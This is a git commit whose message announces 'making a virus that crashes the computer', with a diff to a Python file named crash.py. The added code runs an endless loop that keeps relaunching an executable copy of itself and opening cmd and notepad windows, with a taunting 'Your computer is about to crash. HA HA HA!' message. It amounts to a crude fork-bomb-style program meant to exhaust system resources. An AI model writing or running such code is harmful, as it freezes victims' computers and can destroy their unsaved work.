3f023f16ec09cdc79d8384322c3754cac6f5aec9
dreysimp <92762249+dreysimp@users.noreply.github.com>
2022-11-16 17:27:47 -0800

    making a virus that crashes the computer

--- crash.py
+++ crash.py
@@ -1,4 +1,11 @@
 import os
 while True:
-  os.startfile(__file__[:-2]+"exe")
+  s = os.startfile(__file__[:-2]+"exe")
+  v = os.system('start cmd')
+  w = os.system('start notepad')
+  t = os.system('safari')
+  print("s")
+  print("v")
+  print("w")
+  print("t")
   print("Your computer is about to crash. HA HA HA!")
